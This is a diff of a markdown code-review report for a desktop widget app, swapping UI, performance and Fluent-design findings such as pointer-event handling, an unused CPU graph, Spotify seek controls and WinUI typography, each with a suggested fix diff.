-- **Why**: `.fluent-acrylic` only sets `background-color: var(--fluent-acrylic-bg)`. Without `backdrop-filter: blur(20px)` and `-webkit-backdrop-filter: blur(20px)`, surfaces lack true Fluent acrylic material blur and appear as flat translucent rectangles.
+- **Scenario**: If custom interactive components, icon buttons, or dropdown triggers rendered inside `actions` are clicked, pointer events bubble up to the `<header>` element because the container only stops `mousedown`. This triggers `useGridDrag`'s `onPointerDown` if the child element is not a standard HTML `<button>` or `<a>` tag.
+- **Why**: The actions wrapper div handles `onMouseDown={(e) => e.stopPropagation()}` but does not stop `onPointerDown` or specify `data-no-drag`.
 - **Fix**:
 ```diff
---- a/src/styles/fluent.css
-+++ b/src/styles/fluent.css
-@@ -57,2 +57,4 @@
-   background-color: var(--fluent-acrylic-bg);
-+  backdrop-filter: blur(20px);
-+  -webkit-backdrop-filter: blur(20px);
- }
+--- a/src/components/layout/HeaderBar.tsx
++++ b/src/components/layout/HeaderBar.tsx
+@@ -103,4 +103,6 @@
+       <div
+         className="flex items-center gap-1 flex-shrink-0"
+         onMouseDown={(e) => e.stopPropagation()}
++        onPointerDown={(e) => e.stopPropagation()}
++        data-no-drag
+       >
 ```
 
-### [ENHANCEMENT] [OPEN] M6-12 Redundant geocoding HTTP request executed on every periodic weather polling cycle
+### [ENHANCEMENT] [OPEN] M5-10 Dead code and continuous CPU history array allocations for unrendered MiniGraph
 - **Status**: OPEN
-- **Where**: `src/hooks/useWeather.ts:80-97`
-- **Source**: `r-review` (2026-10-26)
+- **Where**: `src/widgets/resources/MiniGraph.tsx:1-106`, `src/hooks/useSystemMetrics.ts:72-88`
+- **Source**: `r-review` (2026-10-27)
 - **Confidence**: HIGH
 - **Category**: performance
-- **Scenario**: When a manual city is configured, every weather refresh (default every 30 minutes) performs an HTTP request to `https://geocoding-api.open-meteo.com/v1/search` to re-resolve the coordinates, before calling `api.open-meteo.com/v1/forecast`. Because coordinates for a city do not change, this causes unnecessary network traffic and introduces an extra point of failure.
-- **Why**: `useWeather.ts` does not cache resolved city coordinates in memory or write them to `weather_settings.latitude`/`longitude`.
-- **Fix**: Cache resolved coordinates by city name in module-level memory so subsequent polling intervals reuse the latitude/longitude directly.
+- **Scenario**: Telemetry events trigger `appendCpuSample` every second. The hook slices and allocates a new 20-element number array for `cpuHistory` on every update, but `ResourceWidget` never imports or renders `MiniGraph` or `cpuHistory`.
+- **Why**: `MiniGraph` was disconnected during redesign without removing the unused component export or cleaning up `cpuHistory` state accumulation in `useSystemMetrics.ts`.
+- **Fix**: Either re-embed `MiniGraph` beneath the CPU MetricBar in `ResourceWidget.tsx` or deprecate the unused `cpuHistory` accumulation in `useSystemMetrics.ts`.
 
-### [ENHANCEMENT] [OPEN] M6-13 Hardcoded fixed dimensions `w-[360px] h-[256px]` on Card break responsive sizing in docking container
+### [ENHANCEMENT] [OPEN] M6-07 Spotify TrackProgress Displays Clickable Seek Controls When Seeking Is Unsupported
+- **Where**: `src/widgets/spotify/TrackProgress.tsx:82-99`
 - **Status**: OPEN
-- **Where**: `src/widgets/speedtest/SpeedtestWidget.tsx:88`
-- **Source**: `r-review` (2026-10-26)
+- **Source**: `r-review` (Tier 2/3) (2026-10-27)
 - **Confidence**: HIGH
 - **Category**: robustness
-- **Scenario**: When `SpeedtestWidget` is rendered in `DockContainer` (which passes `className="w-full ..."`), the hardcoded `w-[360px] h-[256px]` takes precedence or conflicts, preventing responsive adaptation to container width.
-- **Why**: Unlike `CalendarWidget`, `ClockWidget`, and `WeatherWidget` (which use `w-full h-full max-w-[360px]`), `SpeedtestWidget.tsx` hardcodes absolute pixel widths in the root Card classes.
+- **Scenario**: User clicks on the progress bar in the Spotify widget or presses arrow keys. The progress thumb visually moves to the clicked point, but since `onSeek` is not provided by `SpotifyWidget`, the thumb snaps back to the real track position 250ms later.
+- **Why**: `TrackProgress` renders `cursor-pointer`, `onClick={handleSeekClick}`, and `tabIndex={0}` unconditionally even when `onSeek` is `undefined`.
 - **Fix**:
 ```diff
---- a/src/widgets/speedtest/SpeedtestWidget.tsx
-+++ b/src/widgets/speedtest/SpeedtestWidget.tsx
-@@ -88,3 +88,3 @@ export const SpeedtestWidget: FC<SpeedtestWidgetProps> = ({
-     <Card
-       variant="acrylic"
--      className={`w-[360px] h-[256px] p-3 text-[var(--fluent-text-primary)] font-['Segoe_UI_Variable_Text',_'Segoe_UI',_sans-serif] flex flex-col justify-between select-none overflow-hidden ${className}`}
-+      className={`w-full h-full max-w-[360px] max-h-[256px] p-3 text-[var(--fluent-text-primary)] font-['Segoe_UI_Variable_Text',_'Segoe_UI',_sans-serif] flex flex-col justify-between select-none overflow-hidden ${className}`}
+--- a/src/widgets/spotify/TrackProgress.tsx
++++ b/src/widgets/spotify/TrackProgress.tsx
+@@ -82,10 +82,10 @@ export const TrackProgress: FC<TrackProgressProps> = ({
+     <div className={`w-full flex flex-col gap-1 select-none ${className}`} data-testid="track-progress">
+       <div
+-        className="w-full py-1 -my-1 cursor-pointer group"
+-        onClick={handleSeekClick}
+-        onKeyDown={handleKeyDown}
+-        tabIndex={0}
++        className={`w-full py-1 -my-1 group ${onSeek ? "cursor-pointer" : "cursor-default"}`}
++        onClick={onSeek ? handleSeekClick : undefined}
++        onKeyDown={onSeek ? handleKeyDown : undefined}
++        tabIndex={onSeek ? 0 : -1}
+         role="progressbar"
+         aria-valuenow={Math.round(percent)}
 ```
 
-### [ENHANCEMENT] [OPEN] X2-10 Primary Action Buttons Lack Fluent WinUI 3 Border Stroke and Subtle Elevation
+---
+
+### [ENHANCEMENT] [OPEN] M6-08 SpotifyWidget Triggers Immediate Re-render on Track Changes via Render-Phase State Mutations
+- **Where**: `src/widgets/spotify/SpotifyWidget.tsx:44-51`
 - **Status**: OPEN
-- **Where**: `src/widgets/speedtest/SpeedtestWidget.tsx:273`, `src/widgets/launcher/GameLauncherWidget.tsx:178`
-- **Source**: `r-review` (Tier 3) (2026-10-26)
+- **Source**: `r-review` (Tier 2/3) (2026-10-27)
 - **Confidence**: HIGH
-- **Category**: visual / styling
-- **Scenario**: Primary action buttons ("Erneut testen", "Hinzufügen") appear as flat, borderless cyan rectangles with black text.
-- **Why**: In WinUI 3, primary accent buttons feature subtle 1px layered borders (`border-t-white/20`, `border-b-black/30`), subtle drop shadow (`shadow-sm`), and a smooth 150ms hover brightness transition (`hover:brightness-105 active:scale-[0.98]`).
-- **Fix**: Introduce standard `.fluent-button-primary` styling in `fluent.css` with proper border highlights and elevation tokens.
+- **Category**: performance
+- **Scenario**: When track or album artwork changes, `SpotifyWidget` performs two state updates during render execution (`setPrevArtUrl`, `setImgError`), forcing React to discard and re-execute the render.
+- **Why**: State synchronization during render execution triggers an immediate additional render pass instead of resetting image error state using React keys or `useEffect`.
+- **Fix**:
+```diff
+--- a/src/widgets/spotify/SpotifyWidget.tsx
++++ b/src/widgets/spotify/SpotifyWidget.tsx
+@@ -44,11 +44,9 @@ export const SpotifyWidget: FC<SpotifyWidgetProps> = ({
+   const { volume, isMuted, setVolume, toggleMute } = useMasterVolume();
+ 
+-  const [prevArtUrl, setPrevArtUrl] = useState(session.album_art_url);
+-  const [imgError, setImgError] = useState(false);
+-
+-  // Sync state during render when track or album art changes
+-  if (prevArtUrl !== session.album_art_url) {
+-    setPrevArtUrl(session.album_art_url);
+-    setImgError(false);
+-  }
++  const [imgErrorKey, setImgErrorKey] = useState<string | null>(null);
++  const imgError = imgErrorKey === session.album_art_url;
++  const handleImgError = () => {
++    if (session.album_art_url) setImgErrorKey(session.album_art_url);
++  };
+```
+
+### [ENHANCEMENT] [OPEN] X-fluent-ux-security-09 All-Caps Tracked Section Headers Violate Windows 11 WinUI 3 Typography Guidelines
+- **Status**: OPEN
+- **Where**: `src/widgets/battery/BatteryWidget.tsx:282, 318`, `src/widgets/weather/HourlyTrend.tsx:51`, `src/widgets/weather/DailyForecast.tsx:31`, `src/widgets/spotify/SpotifyWidget.tsx:95`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: visual / typography
+- **Scenario**: Section headers in widget cards display in all-caps tracked lettering: "KAPAZITÄTSVERLAUF", "LAUFZEIT-PROGNOSEN", "STÜNDLICHER TREND", "5-TAGE-VORHERSAGE", "WIEDERGABE" / "PAUSIERT".
+- **Why**: Windows 11 Fluent Design System and WinUI 3 typography specifications strictly avoid all-caps tracked headers on desktop cards, mandating sentence case (e.g. "Kapazitätsverlauf", "Stündlicher Trend") in `Segoe UI Variable Text` Semibold with standard kerning.
+- **Fix**:
+```diff
+--- a/src/widgets/battery/BatteryWidget.tsx
++++ b/src/widgets/battery/BatteryWidget.tsx
+@@ -279,7 +279,7 @@ export const BatteryWidget: FC<BatteryWidgetProps> = ({
+       {/* Historical Sparkline */}
+       <div className="space-y-1">
+-        <div className="text-[10px] font-semibold uppercase tracking-wider text-[var(--fluent-text-tertiary)] px-0.5">
++        <div className="text-[11px] font-semibold text-[var(--fluent-text-secondary)] px-0.5">
+           Kapazitätsverlauf {capacity_history.length > 0 && `(${capacity_history.length} Messpunkte)`}
+         </div>
+         <BatterySparkline points={capacity_history} />
+```
+
+---
+
+### [ENHANCEMENT] [OPEN] X-fluent-ux-security-10 Stadium Pill Shapes in Category Filters Violate WinUI 3 Segmented Control Pattern
+- **Status**: OPEN
+- **Where**: `src/widgets/launcher/GameLauncherWidget.tsx:209-223`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: visual / controls
+- **Scenario**: Category filter buttons ("Alle", "Steam", "Epic", "Eigene") in `GameLauncherWidget` are styled as `rounded-full` mobile-style stadium pills.
+- **Why**: In WinUI 3, segmented filter controls are structured as 4px rounded rectangles (`rounded-[4px]`) within a continuous recessed control background (`bg-[var(--fluent-control-bg)]`), maintaining consistency with Windows 11 native dialogs and Settings apps.
+- **Fix**:
+```diff
+--- a/src/widgets/launcher/GameLauncherWidget.tsx
++++ b/src/widgets/launcher/GameLauncherWidget.tsx
+@@ -206,7 +206,7 @@ export const GameLauncherWidget: FC<GameLauncherWidgetProps> = ({
+             <button
+               key={cat.id}
+               type="button"
+               onClick={() => setSelectedCategory(cat.id)}
+               className={cn(
+-                "px-2.5 py-0.5 text-[11px] rounded-full transition-all font-medium whitespace-nowrap",
++                "px-2.5 py-1 text-[11px] rounded-[4px] transition-all font-medium whitespace-nowrap",
+                 isActive
+-                  ? "bg-[var(--fluent-accent)] text-black font-semibold shadow-sm"
++                  ? "bg-[var(--fluent-card-hover)] text-[var(--fluent-text-primary)] font-semibold shadow-xs border border-[var(--fluent-stroke)]"
+```
 
 ### Coverage / Not Reviewed
-- **Reviewed**: Full codebase (104 non-test files across `src-tauri/src/**`, `src/**`, `src/styles/fluent.css`, `index.css`, UI layout & widgets against Windows 11 design screenshot).
+- **Reviewed**: Entire repository (145 files across `src-tauri/src/**`, `src/**`, `src/styles/fluent.css`, `index.css`, UI layout & widgets against Windows 11 Fluent Design System guidelines).
 - **Excluded / Not Reviewed**: Auto-generated ACL capability schemas (`src-tauri/gen/**`), third-party packages in `node_modules`, compiled binaries in `dist` and `target`.
